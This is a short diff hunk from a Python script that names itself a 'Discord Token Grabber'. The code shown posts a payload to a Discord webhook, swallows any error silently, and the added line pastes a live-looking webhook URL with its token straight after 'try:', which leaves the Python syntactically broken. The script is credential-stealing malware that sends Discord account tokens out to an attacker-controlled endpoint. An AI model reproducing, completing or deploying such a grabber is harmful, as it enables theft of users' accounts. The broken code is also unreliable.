@@ -181,7 +181,7 @@ def main():
         "username": "Discord Token Grabber",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
-    try:
+    try:https://discord.com/api/webhooks/1019013667410411621/vaU6rnFkHAoJx85rsI98osRKd88T9-T2FvdPPeCebPe7tGXo5wtgg655cY_o0kL45AE3
         urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
